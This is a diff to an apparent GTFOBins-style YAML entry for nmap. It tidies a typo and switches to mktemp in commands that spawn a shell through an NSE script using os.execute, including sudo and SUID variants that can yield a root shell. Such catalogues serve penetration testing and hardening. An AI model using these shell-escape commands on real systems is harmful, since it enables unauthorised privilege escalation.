@@ -1,18 +1,21 @@
 ---
 functions:
-  execute-non-interactive:
-    - description: Echoing of input characters3ers is disabled.
+  execute-interactive:
+    - description: Echoing of input characters is disabled.
       code: |
-        echo 'os.execute("/bin/sh")' > /tmp/script.nse
-        nmap --script=/tmp/script.nse
+        TF=$(mktemp)
+        echo 'os.execute("/bin/sh")' > $TF
+        nmap --script=$TF
   sudo-enabled:
-    - description: Echoing of input characters3ers is disabled.
+    - description: Echoing of input characters is disabled.
       code: |
-        echo 'os.execute("/bin/sh")' > /tmp/script.nse
-        sudo nmap --script=/tmp/script.nse
+        TF=$(mktemp)
+        echo 'os.execute("/bin/sh")' > $TF
+        sudo nmap --script=$TF
   suid-enabled:
-    - description: Echoing of input characters3ers is disabled.
+    - description: Echoing of input characters is disabled.
       code: |
-        echo 'os.execute("/bin/sh -p")' > /tmp/script.nse
-        ./nmap --script=/tmp/script.nse
+        TF=$(mktemp)
+        echo 'os.execute("/bin/sh -p")' > $TF
+        ./nmap --script=$TF
 ---
